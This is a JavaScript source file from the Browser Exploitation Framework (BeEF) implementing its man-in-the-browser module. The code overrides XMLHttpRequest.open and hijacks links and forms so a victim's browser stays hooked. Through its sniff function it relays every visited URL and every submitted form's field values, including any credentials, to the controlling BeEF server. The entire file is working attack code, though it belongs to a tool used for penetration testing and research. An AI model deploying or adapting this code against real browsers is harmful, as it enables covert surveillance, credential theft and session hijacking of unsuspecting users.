//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.mitb = {

    cid:null,
    curl:null,

    init:function (cid, curl) {
        beef.mitb.cid = cid;
        beef.mitb.curl = curl;
        /*Override open method to intercept ajax request*/
        var hook_file = "<%= @hook_file %>";

        if (window.XMLHttpRequest && !(window.ActiveXObject)) {

            beef.mitb.sniff("Method XMLHttpRequest.open override");
            (function (open) {
                XMLHttpRequest.prototype.open = function (method, url, async, mitb_call) {
                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
                    // or a request initiated by the MiTB itself.
                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
                        open.call(this, method, url, async, true);
                    }else {
                        var portRegex = new RegExp(":[0-9]+");
                        var portR = portRegex.exec(url);
                        var requestPort;
                        if (portR != null) { requestPort = portR[0].split(":")[1]; }

                        //GET request
                        if (method == "GET") {
                            //GET request -> cross-domain
                            if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port )) {
                                beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
                                window.open(url);
                            }else { //GET request -> same-domain
                                beef.mitb.sniff("GET [Ajax Request]: " + url);
                                if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
                                    var title = "";
                                    if (document.getElementsByTagName("title").length == 0) {
                                        title = document.title;
                                    } else {
                                        title = document.getElementsByTagName("title")[0].innerHTML;
                                    }
                                    // write the url of the page
                                    history.pushState({ Be:"EF" }, title, url);
                                }
                            }
                        }else{
                            //POST request
                            beef.mitb.sniff("POST ajax request to: " + url);
                            open.call(this, method, url, async, true);
                        }
                    }
                };
            })(XMLHttpRequest.prototype.open);
        }
    },

    // Initializes the hook on anchors and forms.
    hook:function () {
        beef.onpopstate.push(function (event) {
            beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
        });
        beef.onclose.push(function (event) {
            beef.mitb.endSession();
        });

        var anchors = document.getElementsByTagName("a");
        var forms = document.getElementsByTagName("form");
        var lis = document.getElementsByTagName("li");

        for (var i = 0; i < anchors.length; i++) {
            anchors[i].onclick = beef.mitb.poisonAnchor;
        }
        for (var i = 0; i < forms.length; i++) {
            beef.mitb.poisonForm(forms[i]);
        }

        for (var i = 0; i < lis.length; i++) {
            if (lis[i].hasAttribute("onclick")) {
                lis[i].removeAttribute("onclick");
                /*clear*/
                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
                /*override*/

            }
        }
    },

    // Hooks anchors and prevents them from linking away
    poisonAnchor:function (e) {
        try {
            e.preventDefault;
            if (beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])) {
                var title = "";
                if (document.getElementsByTagName("title").length == 0) {
                    title = document.title;
                } else {
                    title = document.getElementsByTagName("title")[0].innerHTML;
                }
                history.pushState({ Be:"EF" }, title, e.currentTarget);
            }
        } catch (e) {
            console.error('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
        }
        return false;
    },

    // Hooks forms and prevents them from linking away
    poisonForm:function (form) {
        form.onsubmit = function (e) {
            var inputs = form.getElementsByTagName("input");
            var query = "";
            for (var i = 0; i < inputs.length; i++) {
                if (i > 0 && i < inputs.length - 1) query += "&";
                switch (inputs[i].type) {
                    case "submit":
                        break;
                    default:
                        query += inputs[i].name + "=" + inputs[i].value;
                        break;
                }
            }
            e.preventdefault;
            beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
            history.pushState({ Be:"EF" }, "", form.action);
            return false;
        }
    },

    // Fetches a hooked form with AJAX
    fetchForm:function (url, query, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('POST', url, false, true);
            y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(query);
            beef.mitb.sniff("POST: " + url + "[" + query + "]");
            return true;
        } catch (x) {
            return false;
        }
    },

    // Fetches a hooked link with AJAX
    fetch:function (url, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);
            return true;
        } catch (x) {
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
            return false;
        }
    },

    // Fetches a window.location=http://domainname.com and setting up history
    fetchOnclick:function (url) {
        try {
            var target = document.getElementsByTagName("html")[0];
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    var title = "";
                    if (document.getElementsByTagName("title").length == 0) {
                        title = document.title;
                    }
                    else {
                        title = document.getElementsByTagName("title")[0].innerHTML;
                        }
                    history.pushState({ Be:"EF" }, title, url);
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);

        } catch (x) {
            // the link is cross-domain, so load the resource in a different tab
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
        }
    },

    // Relays an entry to the framework
    sniff:function (result) {
        try {
            beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
        } catch (x) {
        }
        return true;
    },

    // Signals the Framework that the user has lost the hook
    endSession:function () {
        beef.mitb.sniff("Window closed.");
    }
};

beef.regCmp('beef.mitb');